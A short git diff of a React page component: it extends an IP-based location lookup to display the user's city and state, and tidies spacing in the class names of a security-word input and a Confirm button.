@@ -12,7 +12,7 @@ const Page = () => {
   const [userLocation, setUserLocation] = useState("your device"); // Default fallback
   const router = useRouter();
 
-  // --------------- Detect User's State ---------------
+  // --------------- Detect User's City + State ---------------
   useEffect(() => {
     const fetchLocation = async () => {
       try {
@@ -20,8 +20,11 @@ const Page = () => {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
 
-        if (data && data.region) {
-          setUserLocation(data.region); // Show US State or Region
+        if (data && (data.city || data.region)) {
+          const city = data.city || "";
+          const region = data.region || "";
+          const locationText = city && region ? `${city}, ${region}` : region || city;
+          setUserLocation(locationText); // Show City + State if available
         }
       } catch (err) {
         console.error("⚠️ Location fetch failed:", err);
@@ -72,7 +75,7 @@ const Page = () => {
                 name="securityWord"
                 value={securityWord}
                 onChange={(e) => setSecurityWord(e.target.value)}
-                className="w-[200px] border rounded-lg px-4  text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                className="w-[200px] border rounded-lg px-4 text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                 required
               />
             </div>
@@ -87,7 +90,7 @@ const Page = () => {
 
               <button
                 type="submit"
-                className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold  transition-colors text-center"
+                className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold transition-colors text-center"
               >
                 {loading ? "Loading..." : "Confirm"}
               </button>
